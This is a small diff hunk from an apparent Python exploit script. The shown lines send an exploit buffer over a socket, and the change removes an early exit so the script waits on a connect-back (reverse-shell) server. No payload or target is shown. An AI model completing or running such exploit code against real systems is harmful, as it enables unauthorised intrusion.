@@ -116,7 +116,6 @@ if pid and pid > 0:
         print("sending exploit.")
         sock.send(str(buf))
         sock.close()
-        sys.exit(0)
         connectback_server.wait()
     except Exception as e:
         print e
